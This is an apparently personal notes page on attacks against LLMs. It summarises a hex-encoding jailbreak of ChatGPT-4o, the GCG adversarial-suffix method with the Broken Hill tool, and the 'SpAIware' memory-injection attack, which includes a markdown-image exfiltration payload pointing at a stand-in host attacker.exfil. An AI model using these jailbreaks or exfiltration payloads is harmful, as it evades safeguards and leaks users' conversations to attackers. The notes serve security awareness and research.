# AI Exploits

## 

- NIST Artificial Intelligence Risk Management Framework
- Google's Secure AI Framework
- OWASP Top 10 for LLM
- OWASP Top 10 for LLM Applications
- The [recently launched](https://www.darkreading.com/threat-intelligence/mitre-launches-ai-incident-sharing-initiative) MITRE ATLAS




## Encoding Attacks

Sometimes just hexadecimal is enough - [ChatGPT-4o Guardrail Jailbreak: Hex Encoding for Writing CVE Exploits - Marco Figueroa](https://0din.ai/blog/chatgpt-4o-guardrail-jailbreak-hex-encoding-for-writing-cve-exploitsi)


## Greedy Coordinate Gradient (GCG) Attack

[bishopfox.com - Broken Hill Attack Tool and GCG Attack](https://bishopfox.com/blog/brokenhill-attack-tool-largelanguagemodels-llm):
*A GCG attack begins with two inputs from the operator: a request that will be sent to an LLM, and the beginning of an ideal response that the LLM could send back, if the LLM were not conditioned or instructed to avoid providing that response*. The operator provides *Adversarial content* that *causes the LLM to instead predict that the most likely continuation is*. To highlight the cause of LLM response, it is the mechanic statistical matching of what it statistically matches as a complete response. *So the LLM will then continue to add more text until the response appears complete*, *...even if the LLM has been conditioned to not provide the type of information in the request, it is very likely to ignore that conditioning, because (to anthropomorphize a bit) the LLM can see that it has already agreed to provide the information, and therefore, statistically, the most likely text to follow is exactly the information it was conditioned not to provide.*

Tool: [GitHub BishopFox/BrokenHill](https://github.com/BishopFox/BrokenHill)
## SpAIware

The introduction of API call named `url_safe` in ChatGPT informs the client if it is safe to display a URL or an image to the user or not, but this a client side check; not server-side.

1. First a memory is injected with prompt to go to `http://attacker.exfil/p.txt`, which is destination of the exfiltration of future prompts.  The payload is markdown image syntax reference`![](http://attacker.exfil/0.png?chatgptmacos=http://attacker.exfil/p.txt)`

[YouTube EmbraceTheRed Demonstration](https://www.youtube.com/watch?v=zb0q5AW5ns8&themeRefresh=1)
[embracethered.com - hatgpt-macos-app-persistent-data-exfiltration/](https://embracethered.com/blog/posts/2024/chatgpt-macos-app-persistent-data-exfiltration/)
[thehackernews - chatgpt-macos-flaw-couldve-enabled-long](https://thehackernews.com/2024/09/chatgpt-macos-flaw-couldve-enabled-long.html)

Continuous Mitigation:
- Clear your ChatGPT memory and hope that the provider deletes your data


## References

[GitHub BishopFox/BrokenHill](https://github.com/BishopFox/BrokenHill)
[bishopfox.com - Broken Hill Attack Tool and GCG Attack](https://bishopfox.com/blog/brokenhill-attack-tool-largelanguagemodels-llm):
[YouTube EmbraceTheRed Demonstration](https://www.youtube.com/watch?v=zb0q5AW5ns8&themeRefresh=1)
[embracethered.com - hatgpt-macos-app-persistent-data-exfiltration/](https://embracethered.com/blog/posts/2024/chatgpt-macos-app-persistent-data-exfiltration/)
[thehackernews - chatgpt-macos-flaw-couldve-enabled-long](https://thehackernews.com/2024/09/chatgpt-macos-flaw-couldve-enabled-long.html)
[ChatGPT-4o Guardrail Jailbreak: Hex Encoding for Writing CVE Exploits - Marco Figueroa](https://0din.ai/blog/chatgpt-4o-guardrail-jailbreak-hex-encoding-for-writing-cve-exploitsi)
